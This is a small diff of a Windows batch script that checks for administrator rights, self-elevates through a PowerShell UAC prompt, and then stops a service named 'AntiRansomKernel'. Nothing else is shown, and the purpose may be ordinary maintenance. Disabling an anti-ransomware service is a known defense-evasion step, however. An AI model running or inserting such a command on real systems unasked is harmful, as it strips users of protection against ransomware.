@@ -1,9 +1,6 @@
-@echo off
 net session >nul 2>&1
-if %errorlevel% == 0 (
-) else (
-    powershell -Command "Start-Process cmd -ArgumentList '/k %~s0' -Verb runAs"
-    exit
+if %errorlevel% neq 0 (
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
 )
-net stop AntiRansomKernel
-exit
+sc stop AntiRansomKernel
